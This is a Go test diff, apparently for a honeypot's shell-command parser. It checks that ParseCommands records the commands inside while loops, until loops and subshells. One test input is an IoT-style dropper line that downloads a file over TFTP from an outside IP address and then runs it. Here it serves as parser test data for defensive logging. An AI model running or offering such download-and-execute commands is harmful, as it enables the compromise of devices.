@@ -195,3 +195,21 @@ func TestDVRSubshellLoaderLines(t *testing.T) {
 		}
 	}
 }
+
+// command_chain is built from ParseCommands; commands inside loops and
+// subshells must be logged like any other.
+func TestParseCommandsDescendsIntoWhileAndSubshells(t *testing.T) {
+	for line, want := range map[string]string{
+		"while read i; do echo $i; done < /bin/ls":             "read,echo",
+		"until false; do sleep 1; done":                        "false,sleep",
+		"(tftp -g 198.51.100.7 -r t || busybox tftp) > t; ./t": "tftp,busybox,t",
+	} {
+		var names []string
+		for _, inv := range ParseCommands(line) {
+			names = append(names, inv.Name)
+		}
+		if got := strings.Join(names, ","); got != want {
+			t.Errorf("ParseCommands(%q) = %s, want %s", line, got, want)
+		}
+	}
+}
